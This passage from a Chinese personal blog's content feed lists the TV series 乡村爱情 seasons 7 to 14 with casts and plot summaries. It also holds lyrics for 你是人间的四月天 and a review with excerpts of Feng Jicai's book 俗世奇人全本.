影片信息</h2><ul><li>片名：乡村爱情圆舞曲</li><li>又名：乡村爱情7</li><li>导演：刘流/周英男</li><li>编剧：张继</li><li>主演：王小利/赵本山/毕畅/小沈阳</li><li>播出：山东/江苏/天津/辽宁/黑龙江卫视</li><li>首播：2014-02-03（中国大陆）</li><li>类型：喜剧/爱情</li><li>集数：66</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="72-剧情介绍"><a class="markdownIt-Anchor" href="#72-剧情介绍"></a> 7.2 剧情介绍</h2><p>新的一年，象牙山村悲欢离合的故事继续上演。长贵（王小虎 饰）为救小梁溺水身亡，愧疚满怀的小梁执意要认大脚当干妈。大脚悲伤挠头之余，还不得不一次次张罗给青莲介绍对象的事。谢广坤（唐鉴军 饰）一直为孙子大业发愁，眼瞅着小蒙生育无望，他想出抱养的点子。抱了外孙女的刘能（王小利 饰）趾高气昂，时不时调侃老四（刘小光 饰）和广坤，还为竞选理事会长大费周章。山庄那里也不闲着，保安队长晓峰自信心膨胀，令刘大脑袋（刘流 饰）和王大拿（赵本山 饰）焦头烂额，而久未露面的王木生（田娃 饰）突然回归，又使得山庄的权力斗争和家族内务波谲云诡……</p><p>所有人的命运都发生着变化，他们的生活将呈现怎样的格局？</p><h1 id="8-乡村爱情浪漫曲2015"><a class="markdownIt-Anchor" href="#8-乡村爱情浪漫曲2015"></a> 8 乡村爱情浪漫曲（2015）</h1><h2 id="81-影片信息"><a class="markdownIt-Anchor" href="#81-影片信息"></a> 8.1 影片信息</h2><ul><li>片名：乡村爱情浪漫曲</li><li>又名：乡村爱情8/Country Love Romance</li><li>导演：孟令宇</li><li>编剧：张继</li><li>主演：赵本山/毕畅/吴云飞/王小利/刘小光</li><li>播出：腾讯视频</li><li>首播：2015-12-11（中国大陆）</li><li>类型：剧情/喜剧</li><li>集数：65</li><li>每集：40</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="82-剧情介绍"><a class="markdownIt-Anchor" href="#82-剧情介绍"></a> 8.2 剧情介绍</h2><p>风光秀美的象牙山又迎来了极其闹腾的一年。嘚嘚瑟瑟的谢广坤（唐鉴军 饰）祖坟冒了青烟，王小蒙（毕畅 饰）居然给他生了龙凤胎孙伙计，这可把广坤时刻想要显摆的心美坏了，他大张旗鼓要搞庆祝，这期间却忽略了腾飞的感受。广坤的死对头刘能（王小利 饰）看在眼里，气在心头，一门心思地要干帮超，将希望全都寄托在闺女刘英的肚皮上。亲家赵四（刘晓光 饰）的生意越做越红火，眼瞅着就不把刘能放在眼里了，新的矛盾由此产生。香秀即将迎来新生命，但她和李大国的婚姻却走向破裂边缘。新的政策出台，让山庄的效益直线下降，王大拿（赵本山 饰）发愁之际，后院似乎也见到了火苗子。</p><p>大大小小的人物，继续装点着他们各自的人生……</p><h1 id="9-乡村爱情进行曲2017"><a class="markdownIt-Anchor" href="#9-乡村爱情进行曲2017"></a> 9 乡村爱情进行曲（2017）</h1><h2 id="91-影片信息"><a class="markdownIt-Anchor" href="#91-影片信息"></a> 9.1 影片信息</h2><ul><li>片名：乡村爱情进行曲</li><li>又名：乡村爱情9</li><li>导演：孟令宇/付滃</li><li>编剧：张继</li><li>主演：赵本山/ 贺树峰/ 毕畅/ 唐鉴军/ 金玫玫/ 周弋楠/小沈阳 /王小利/ 刘小光/于月仙/ 蔡维利/王小虎</li><li>播出：腾讯视频</li><li>首播：2017-02-01（中国大陆）</li><li>类型：剧情/喜剧</li><li>集数：60</li><li>每集：45</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="92-剧情介绍"><a class="markdownIt-Anchor" href="#92-剧情介绍"></a> 9.2 剧情介绍</h2><p>象牙山村的成绩不太理想，徐支书很头疼。村民得知香秀和马忠经常吵架以为马忠欺负香秀了，受过长贵恩惠的徐支书听闻此事，带着村民找马忠评理。镇里觉得徐支书做法过激，撤掉他职务并委派一位“第一书记”主持村里工作。第一书记到来，做了三件事——</p><p>重新选村主任，扶植小蒙豆腐厂为村办企业标杆以及带领村民网上销售农副产品。而大脚遇到了长得和长贵一样的外村大夫王福根并展开了追求，在村民的帮助下，福根终于同意在象牙山村生活，并带来了长得俊俏一儿一女，引起了村民的骚动。晓燕怀孕了，大拿在木生的唆使下，对孩子的身世产生怀疑，晓燕伤心不已。在村民共同努力下，宋晓峰当上了村主任并让象牙山村重回优秀村的行列；刘能和玉田的电商生意如火如荼；永强在大家的帮助下站了起来；大拿和晓燕重归于好；象牙山在一片欣欣向荣的景象中迎接新年。</p><h1 id="10-乡村爱情协奏曲2018"><a class="markdownIt-Anchor" href="#10-乡村爱情协奏曲2018"></a> 10 乡村爱情协奏曲（2018）</h1><h2 id="101-影片信息"><a class="markdownIt-Anchor" href="#101-影片信息"></a> 10.1 影片信息</h2><ul><li>片名：乡村爱情协奏曲</li><li>又名：乡村爱情10</li><li>导演：付滃/孟令宇</li><li>编剧：张继</li><li>主演：毕畅/ 贺树峰/ 唐鉴军/ 王小利/ 刘小光 / 蔡维利/ 于月仙/赵本山/ 关婷娜/刘流/王小宝/王小虎/宋晓峰/田娃/闫光明/ 蒋依杉/吴云飞 / 王君平/ 金玫玫/ 周弋楠/ 付滃/ 赵海燕/毛毛/ 曹桐睿</li><li>播出：腾讯视频</li><li>首播：2018-02-05（中国大陆）</li><li>类型：剧情/喜剧</li><li>集数：60</li><li>每集：45</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="102-剧情介绍"><a class="markdownIt-Anchor" href="#102-剧情介绍"></a> 10.2 剧情介绍</h2><p>该剧本季主要围绕象牙山年轻人的婚恋故事展开，刘能、谢广坤携手成立“大龄青年婚姻理事会”，为解决大龄青年单身问题出谋划策，却闹出一系列嘀笑皆非的故事。</p><h1 id="11-乡村爱情112019"><a class="markdownIt-Anchor" href="#11-乡村爱情112019"></a> 11 乡村爱情11（2019）</h1><h2 id="111-影片信息"><a class="markdownIt-Anchor" href="#111-影片信息"></a> 11.1 影片信息</h2><ul><li>片名：乡村爱情11</li><li>又名：乡村爱情11狂欢曲</li><li>导演：付滃/孟令宇</li><li>编剧：李海兵/杨景标</li><li>主演：赵本山/ 狄龙/ 毕畅/ 贺树峰/ 王小利/ 刘小光/唐鉴军/ 宋晓峰/蔡维利/ 于月仙/ 马心怡/闫光明/ 唐娜</li><li>播出：优酷</li><li>首播：2019-01-26（中国大陆）</li><li>类型：剧情/喜剧/爱情</li><li>集数：60</li><li>每集：45</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="112-剧情介绍"><a class="markdownIt-Anchor" href="#112-剧情介绍"></a> 11.2 剧情介绍</h2><p>《乡村爱情11》于2019年1月26日优酷全网独播，每周一至周六早上10:00更新。本剧讲述了以刘能、广坤、赵四为首的象牙山村民在新时代背景下，就“精准扶贫”“招商引资”等国家惠农政策的误解，与新到任大学生村官杜小双以及到象牙山投资的神秘富豪，发生的一系列依旧搞笑无解的故事。</p><h1 id="12-乡村爱情122020"><a class="markdownIt-Anchor" href="#12-乡村爱情122020"></a> 12 乡村爱情12（2020）</h1><h2 id="121-影片信息"><a class="markdownIt-Anchor" href="#121-影片信息"></a> 12.1 影片信息</h2><ul><li>片名：乡村爱情12</li><li>又名：乡村爱情第十二部</li><li>导演：付滃/孙博</li><li>编剧：何庆魁/李海兵</li><li>主演：赵本山/ 毕畅/ 贺树峰/ 王小利/ 刘小光/唐鉴军/曹桐睿/ 宋晓峰/蔡维利/ 于月仙/ 马心怡/闫光明/ 唐娜</li><li>播出：优酷</li><li>首播：2020-01-25（中国大陆）</li><li>类型：喜剧/爱情</li><li>集数：60</li><li>每集：42</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="122-剧情介绍"><a class="markdownIt-Anchor" href="#122-剧情介绍"></a> 12.2 剧情介绍</h2><p>镇里新派来的女村官杜小双和刘一水承担起了建设生态新农庄的重任，二人一路磕磕碰碰，即将修成正果之时刘一水却意外查到得了慢性胰腺炎，最终拒绝杜小双追求独自进了手术室，一水的手术是否顺利，他和杜小双的结局究竟如何。富二代李成继承公司后续情感线又将走向何处。被挖墙角的大拿狗场又将面临怎样的局面。象牙山F4，刘能、赵四、谢广坤、王老七又将上演什么样的相爱相杀。</p><h1 id="13-乡村爱情132021"><a class="markdownIt-Anchor" href="#13-乡村爱情132021"></a> 13 乡村爱情13（2021）</h1><h2 id="131-影片信息"><a class="markdownIt-Anchor" href="#131-影片信息"></a> 13.1 影片信息</h2><ul><li>片名：乡村爱情13</li><li>导演：付滃/孟令宇</li><li>主演：赵本山/ 倪大红/ 唐鉴军/刘小光/ 田娃/ 毕畅/贺树峰/于月仙/蒋依杉/吴云飞/曹桐睿/马心怡/赵海燕/孙立荣/赵明远/刘流/高赫迪/张小伟 / 董三毛/金鸿鸣/ 付滃/ 蔡维利/魏欣宇/筱素清/王小宝 /张小飞/关婷娜/王小华 / 葛珊珊/ 王悦/陈爽/ 王小虎/王君平/闫光明/ 金玫玫/ 燕飞/张可/ 曹兴/ 霍云龙</li><li>播出：优酷</li><li>首播：2021-02-16（中国大陆）</li><li>类型：喜剧/爱情</li><li>集数：40</li><li>每集：45</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="132-剧情介绍"><a class="markdownIt-Anchor" href="#132-剧情介绍"></a> 13.2 剧情介绍</h2><p>为搭乘“线上经济”的快车，象牙山又刮起强劲的“网络风”。谁能想到王大拿与杨晓燕的婚烟会隔着手机屏拉警报？而F4组合谢广坤、刘能、赵四和王老七趁机也起幺蛾子，王小蒙和刘英难免又入坑。宋富贵和宋晓峰互使连环套，哪是翁婿？分明是冤家。小山村里锅边炕沿的故事又会带给我们怎样的欢乐？</p><h1 id="14-乡村爱情142022"><a class="markdownIt-Anchor" href="#14-乡村爱情142022"></a> 14 乡村爱情14（2022）</h1><h2 id="141-影片信息"><a class="markdownIt-Anchor" href="#141-影片信息"></a> 14.1 影片信息</h2><ul><li>片名：乡村爱情14</li><li>导演：付滃/孟令宇</li><li>编剧：李海兵</li><li>主演：唐鉴军/王小利/ 刘小光 / 宋晓峰/ 倪大红 / 蔡维利/ 毕畅/ 贺树峰/田娃/ 关婷娜/ 曹桐睿/蒋依杉/吴云飞/赵海燕/ 孙立荣 /马心怡/刘流/张小伟/董三毛 / 付翁/ 王小宝/ 张小飞/闫光明/孟令宇</li><li>播出：优酷</li><li>首播：2022-01-24（中国大陆）</li><li>类型：喜剧/爱情</li><li>集数：40</li><li>每集：45</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="142-剧情介绍"><a class="markdownIt-Anchor" href="#142-剧情介绍"></a> 14.2 剧情介绍</h2><p>淘宝直播基地的建成，无疑为已踏入小康的象牙山，又翻开了新的篇章。过了色彩斑斓的深秋，就会迎来白雪皑皑的冬季，市里提出了“打造乡村冬季生态游”的号召，大学生村官杜小双积极响应，决定举办“舌尖上的象牙山”。为充分调动大家参与的积极性，并在对外宣传上造势，宣布“冠军”奖金十万。</p><h1 id="x-解说"><a class="markdownIt-Anchor" href="#x-解说"></a> X 解说</h1><ul><li><a href="https://www.youtube.com/watch?v=rxjMvDinxL4" target="_blank" rel="noopener">刘老师说电影</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 影视 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电视剧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>示例-《城南旧事》电影</title>
      <link href="/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8A%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B%E3%80%8B%E7%94%B5%E5%BD%B1/"/>
      <url>/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8A%E5%9F%8E%E5%8D%97%E6%97%A7%E4%BA%8B%E3%80%8B%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Life is painting a picture, not doing a sum.</p>]]></content>
      
      
      <categories>
          
          <category> 影视 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>示例-《你是人间的四月天》歌曲</title>
      <link href="/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8A%E4%BD%A0%E6%98%AF%E4%BA%BA%E9%97%B4%E7%9A%84%E5%9B%9B%E6%9C%88%E5%A4%A9%E3%80%8B/"/>
      <url>/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8A%E4%BD%A0%E6%98%AF%E4%BA%BA%E9%97%B4%E7%9A%84%E5%9B%9B%E6%9C%88%E5%A4%A9%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>「——你是爱，是暖，<br>是希望，你是人间的四月天！」</p><p>草长莺飞的四月，李宇春受大型诗词音乐文化节目《经典咏流传》邀请，将于央视一套演绎林徽因经典名作《你是人间的四月天》。通过诗歌和音乐，遥望并呼应85年前林徽因笔下的春深光景，用温柔嗓音传递恒久的美与爱。</p><p>在歌曲创作阶段，李宇春用一个多月的时间浏览相关书籍和影像，对创作者背景和时代风貌进行了详细调研，从众多经典诗词中选择《你是人间的四月天》进行演绎，并邀请音乐人彭青为这首诗词谱曲。两位女性音乐人以敏锐而温柔的视角，还原并呈现了诗歌的韵律与意象，将春日的轻灵喜悦和诗歌的东方之美进行了生动表达。</p><p>歌曲将丰盛藏于淡泊，乍听水波不兴，细节却暗藏波澜。虽然是经典的中文诗歌，编曲上却并未过多使用中国乐器元素，仅用五声调式钢琴和弦乐突显诗歌韵脚，酝酿出清丽的氛围。李宇春则用轻如呢喃的演唱方式，将「雪化后那片鹅黄」 「新鲜初放芽的绿」等春天意象，唱得格外柔软。</p><p>作为一名具有先锋态度的音乐人，同时也是一位不断探索音乐、艺术、时尚等领域多元文化价值的当代女性，李宇春与终其一生传递美的价值的林徽因一样，在自我内化和丰富的同时，凭借旺盛的生命力和开阔的视野，在各领域中勇敢地创新美的表达，延展美的样态，自由地传递一种生动而有力量的美感。</p><h1 id="2-歌手"><a class="markdownIt-Anchor" href="#2-歌手"></a> 2 歌手</h1><p><strong>李宇春</strong>（英语：Chris Li Yu-chun，1984年3月10日－），出生于<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9C%8B" target="_blank" rel="noopener">中国</a><a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E5%B7%9D" target="_blank" rel="noopener">四川</a>成都，为<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9C%8B%E5%A4%A7%E9%99%B8" target="_blank" rel="noopener">中国大陆</a>女歌手、词曲创作人、电影演员、演唱会导演。</p><ul><li><a href="https://baike.baidu.com/item/%E6%9D%8E%E5%AE%87%E6%98%A5/80102" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/zh-hans/%E6%9D%8E%E5%AE%87%E6%98%A5" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-歌词"><a class="markdownIt-Anchor" href="#3-歌词"></a> 3 歌词</h1><center>你是人间的四月天 (Live) - 李宇春<p>词：林徽因</p><p>曲：彭青</p><p>编曲：郑楠</p><p>演唱：李宇春</p><p>音乐总监：刘卓</p><p>乐团：V Band</p><p>弦乐：靳海音®弦乐团</p><p>混音：周天澈 混音团队</p><p>我说你是人间的四月天</p><p>笑响点亮了四面风</p><p>轻灵在春的光艳中</p><p>交舞着变</p><p>你是四月早天里的云烟</p><p>黄昏吹着风的软</p><p>星子在无意中闪</p><p>细雨点洒在花前</p><p>那轻 那娉婷 你是</p><p>鲜妍百花的冠冕 你戴着</p><p>你是天真是庄严</p><p>你是夜夜的月圆</p><p>雪化后那片鹅黄 你像</p><p>新鲜初放芽的绿 你是</p><p>柔嫩喜悦</p><p>水光浮动着你梦</p><p>浮动着你梦期待中白莲</p><p>雪化后那片鹅黄 你像</p><p>新鲜初放芽的绿 你是</p><p>柔嫩喜悦</p><p>水光浮动着你梦</p><p>浮动着你梦期待中白莲</p><p>你是四月早天里的云烟</p><p>黄昏吹着风的软</p><p>星子在无意中闪</p><p>细雨点洒在花前</p><p>那轻 那娉婷 你是</p><p>鲜妍百花的冠冕 你戴着</p><p>你是天真是庄严</p><p>你是夜夜的月圆</p><p>雪化后那片鹅黄 你像</p><p>新鲜初放芽的绿 你是</p><p>柔嫩喜悦</p><p>水光浮动着你梦</p><p>浮动着你梦期待中白莲</p><p>雪化后那片鹅黄 你像</p><p>新鲜初放芽的绿 你是</p><p>柔嫩喜悦</p><p>水光浮动着你梦</p><p>浮动着你梦期待中白莲</p><p>你是一树一树的花开</p><p>是燕在梁间呢喃</p><p>你是爱 是暖 是希望</p><p>你是人间的四月天</p></center><p></p><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>xxx</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><p>四月春风，余味隽永。女中音把林徽因的词演绎得柔美而鲜活，听者微醺。以情带声是本事，她的声线是上天赐予的礼物。</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/music/comment/1748566488?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 espionage</a></font></p></blockquote><hr><blockquote><p>人间四月芳菲尽，山寺桃花始盛开。人生悲欢有各自缘法，不要喟叹于眼前的春光消逝，心怀旷达，自然会在别处看见更旖旎的风光和更广阔的天地。</p><p>—— 引自 QQ音乐 陌离</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摘抄第一章</title>
      <link href="/2022/01/21/%E7%A4%BA%E4%BE%8B-%E6%91%98%E6%8A%84/"/>
      <url>/2022/01/21/%E7%A4%BA%E4%BE%8B-%E6%91%98%E6%8A%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Life is painting a picture, not doing a sum.</p><p>—— <font color="blue">引自 网络</font></p></blockquote><blockquote><p>上山的人不要嘲笑下山的人，因为他们也曾风光无限。</p><p>—— <font color="blue">引自 <a href="https://b23.tv/CTqEr3D" target="_blank" rel="noopener">B站</a></font></p></blockquote><blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 摘抄 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《俗世奇人全本》书籍</title>
      <link href="/2022/01/21/%E3%80%8A%E4%BF%97%E4%B8%96%E5%A5%87%E4%BA%BA%E5%85%A8%E6%9C%AC%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/01/21/%E3%80%8A%E4%BF%97%E4%B8%96%E5%A5%87%E4%BA%BA%E5%85%A8%E6%9C%AC%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>天津卫本是水陆码头，居民五方杂处，性格迥然相异。然燕赵故地，血气刚烈；水咸土碱，风习强悍。近百余年来，举凡中华大灾大难，无不首当其冲，因生出各种怪异人物，既在显耀上层，更在市井民间。故而随想随记，始作于今；每人一篇，各不相关，冠之总名《俗世奇人》耳。</p><p>2019年，冯骥才先生又创作了18篇“俗世奇人”新作，现集成《俗世奇人全本》,呈现给读者完整的54篇“俗世奇人”系列，并收录冯骥才先生亲自手绘的58幅生动插图。</p><p>自上世纪九十年代至今，冯骥才先生先后创作了五十四篇“俗世奇人”系列短篇小说。其风格统一、传奇色彩浓郁、充满生活气息、人物形象活灵活现，书写了清末民初天津卫的地域风貌、风土人情、生活风尚，也展现出我国民间文化的精巧技艺与其中蕴藏的智慧。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>冯骥才，浙江宁波慈溪人，1942年2月9日生于天津，作家、画家。 早年在天津从事绘画工作，后专职文学创作和民间文化研究。</p><ul><li><a href="https://baike.baidu.com/item/%E5%86%AF%E9%AA%A5%E6%89%8D/630264?fr=aladdin" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%86%AF%E9%AA%A5%E6%89%8D" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>酒的诀窍，还是在酒缸里。老板人奸，往酒里掺水。酒鬼们对眼睛里的世界一片模糊，对肚子里的酒却一清二楚，但谁也不肯把这层纸捅破，喝美了也就算了。老板缺德，必得报应，人近六十，没儿没女，八成要绝后。可一日，老板娘爱酸爱辣，居然有喜了老板给佛爷叩头时，动了良心，发誓今后老实做人，诚实卖酒，再不往酒里掺水掺假了。</p><p>就是这日，酒婆来到这家小酒馆，进门照例还是掏出包儿来，层层打开，花钱买酒，举手扬脖，把改假为真的“炮打灯”倒进肚里……真货就有真货色。这次酒婆还没出屋，人就转悠起来了。而且今儿她一路上摇晃得分外好看，上身左摇，下身右摇，愈转愈疾，初时赛风中的大鹏鸟，后来竟赛一个黑黑的大漩涡首善街的人看得惊奇，也看得纳闷，不等多想，酒婆已到路口，竟然没有酒醒，破天荒头一遭转悠到大马路上，下边的惨事就甭提了……</p><p>自此，酒婆在这条街上绝了迹。小酒馆里的人们却不时念叨起她来。说她才算真正够格的酒鬼。她喝酒不就菜，照例一饮而尽，不贪解馋，只求酒劲。在酒馆既不多事，也无闲话，交钱喝酒，喝完就走，从来没赊过账。真正的酒鬼，都是自得其乐，不搅和别人。</p><p>老板听着，忽然想到，酒婆出事那日，不正是自己不往酒里掺假的那天吗？原来祸根竟在自己身上他便别扭开了，心想这人间的道理真是说不清道不明了。到底骗人不对，还是诚实不对？不然为嘛几十年拿假酒骗人，却相安无事，都喝得挺美，可一旦认真起来反倒毁了？</p><p>—— <font color="green">引自 酒婆</font></p></blockquote><hr><blockquote><p>“你以为人家的名气全是虚的？那你是在骗自己。好好学本事吧！”</p><p>—— <font color="green">引自 刷子李</font></p></blockquote><hr><blockquote><p>杨巴的脑筋飞快地一转两转三转，主意来了！只见他脑袋撞地，“咚咚咚”叩得山响，一边叫道：“中堂大人息怒！小人不知道中堂大人不爱吃压碎的芝麻粒，惹恼了大人。大人不记小人过，饶了小人这次，今后一定痛改前非！”说完又是一阵响头。</p><hr><p>自此，杨巴在天津城威名大震。那“杨家茶汤”也被人们改称作“杨巴茶汤”了。杨七反倒渐渐埋没，无人知晓。杨巴对此毫不内疚，因为自己成名靠的是自己一张好嘴，李中堂并没有喝茶汤呀</p><p>—— <font color="green">引自 好嘴杨巴</font></p></blockquote><hr><blockquote><p>再看信封，照片竟卡在里边，他捏住照片抻出来一瞧，有点别扭，不大对劲，他再细瞧，竟傻了。那老美倒是站在他那字的前边照了相，可是字儿却挂倒了，全朝下了！</p><p>—— <font color="green">引自 青云楼主</font></p></blockquote><hr><blockquote><p>能人全都死在能耐上。</p><p>—— <font color="green">引自 大回</font></p></blockquote><hr><blockquote><p>他等着院里的人一个个走出来，却一直没等到她出来。他有点心急。</p><p>直到院静人空。一个守门的老人出来关大门时，木头上去问，刚刚那个演白娘子的人呢，怎么没见她出来。</p><p>守门人说：“最后出来的一个就是呀。”</p><p>木头很诧异，说：“那是个瘦高结实的汉子，穿青布袄。”</p><p>守门人说：“正是。”</p><p>木头更诧异，说：“怎么是个男的？我说的是白娘子——女的！”</p><p>守门人一听一怔，随后笑道：“我们高跷会从来不准女人入会。演女的，全是男扮女装。”</p><p>—— <font color="green">引自 跟会</font></p></blockquote><hr><blockquote><p>那你这就不明白了，人的腻歪都是不愁日子不愁钱——闲出来的。穷了犯愁，富了才会腻歪。</p><p>—— <font color="green">引自 腻歪</font></p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>这本书第一次读还是在高中，转眼间，现在大四了。</p><p>本文文字精简利落，半文半百，读起来并不晦涩。冯骥才将津味融入字里行间，如句子中带“嘛”，或者将“胜过”说成“赛”；其次作者的语言中带有天津特有的幽默，读起来有如在听相声。</p><p>在俗世俗人俗事间向读者传递一些人生道理：如酒婆之死、刷子李中的<code>“你以为人家的名气全是虚的？那你是在骗自己。好好学本事吧！”</code>、大回中的<code>能人全都死在能耐上。</code>等等。</p><p>《刷子李》、《好嘴杨巴》、《泥人张》被选入义务教育课程标准实验教材语文书。目前还没有影视作品的拓展，感觉拍成情景式短剧可能不错，人人都是主角。下面评论中提到了做成卡牌类手游，想法新颖。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><p>笔记体的天津的市井风俗与奇人群像。不知道为何会想到可以做一款卡牌类手游，就叫《大天津》</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/book/comment/2185351037?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 RO</a></font></p></blockquote><hr><blockquote><center>《俗世奇人》| 人间烟火处见大雅</center><p>说书人于台上鲜活热闹，角儿们一个个穿着长袍马褂，举着酒盏、嬉笑着眉眼摇身登场，刹那间便驻足了一个时代。</p><p>《俗世奇人》一书以清末民初天津卫为背景，讲述了一十九个绝技与风骨并存的码头人物生平。卷轴缓缓展开，张大力丢下石锁大笑离去，北地豪气快哉纸上；苏七块挥起袖子接筋续骨，规矩不动然医道不改；刷子李、风筝魏、泥人张凭借精到手艺博得满堂彩，站在大街中央吃荤、亮堂；好嘴杨巴叩头佯罪，巧妙化解不识芝麻粒的李中堂的尴尬……想来世事洞明皆学问，人情练达即文章。</p><p>文如其人，文载其道；欲评其文，须先知其人。</p><p>冯骥才有此二身份：一乃民间艺术工作者，曾专职民间文化研究；二乃“文革”后崛起的“伤痕文学运动”代表作家，以“文化反思小说”影响文坛。</p><p>这两重身份带来了两种视角，两种视角深刻地渗透在了《俗世奇人》的文学内容与语言艺术之中。</p><p>大隐隐于市，大雅始于俗。此俗，乃民俗的俗。诗经首篇便是收录民歌的《国风》，俗世生活是一种别样的美，它蕴藏着原生态的力量与智慧。才子佳人素来为文人所道，读多了却尝到了种“为雅而雅”的拘谨刻意，于文学角度略显单薄。津门传说中的小人物则不同，无论是活出殡的刘道元，卖家产的蔡二少爷，还是干鸡鸣狗盗之事的小达子，看似上不得台面，却都因豁达质朴的性子与洋溢在灵魂中的坦诚智慧而鲜活灵动起来。“这些人空前绝后，却都是俗世里的俗人；这些事匪夷所思，却都是真人真事”，他们饱含着对生活的热爱和追求，嬉笑怒骂间定格为天津民俗画中一景，谱写了时代的大雅之章。</p><p>诚觉世人尽可爱，也觉世事尽可戏。世态炎凉在冯骥才笔下无伤春悲秋之造作，反而展现出原生态的赤裸裸的生命热情。众人皆知底层小人物生活辛酸艰难，他偏独辟蹊径，以善意、豁达的笔笑世间形形色色——这世道不公却不公得有趣，奇闻轶事显妙趣横生，皮囊下的灵魂们热闹繁华，每个人都未曾受到奚落。当今文学基调多悲观，彷若于严肃中才能看到生命的厚重，殊不知我们正是需要一种洒脱可爱、人生如戏的智慧；也唯有在这轻快智慧的基调上，我们才能寻觅到追求本我的勇气与力量。</p><p>窃以为经历文革动荡且怀有良知的作家可分两类，一类以沉重笔调记录黑色，一类跳脱出了时代，俯视中将昏暗看成了彩色。二者皆有思考与感悟，不论高下。于个人而言，我偏爱于后者——如王小波，如冯骥才。对时代与命运，他们是消极的，但他们选择了在消极的基调上热情快乐地活着，一如赤子。</p><p>《俗世奇人》中有一篇写酒婆：酒婆举手仰脖，将山芋干造的假酒一饮而尽，出门走路时赛在地上画天书，然从未出事；一天酒老板良心发现，做了真酒，酒婆出门便被撞死了。关于这个故事，冯骥才站在酒老板的角度，于结尾写道：“到底骗人不对，还是诚实不对？”我却更愿站在酒婆的角度看，这样一来，冯和酒婆便有了共通之处：</p><p>酒婆佯醉只求一时欢乐，辨不清骗人还是骗己；冯骥才以澄明轻快的心境回执过往不堪经历，又不知是否为“一晌贪欢”之举？快乐与痛苦本就分不清，既如此，那唯求它鲜活真实。</p><p>民国小影，旧时一瞥。书籍以白描入笔，半文半白，三言两拍。语言结实、神气、不拘泥，形象俏皮，颇具古典传奇色彩，风土人情味儿浓厚。对民俗语言的精准驾驭体现出冯骥才的深厚功力，这与他对民间文化的热爱与研究紧密相关。</p><p>后记里言：“倘若再写，算我无能。说不尽津门的爽利。”</p><p>《俗世奇人》通篇不过百页，故事性与文学性兼具，单个拎出便是说书人口中的一段风月，具有极高的文学艺术价值。其如下酒小菜，初见惊艳，吃罢，回味悠长。</p><p>—— <font color="blue">引自 <a 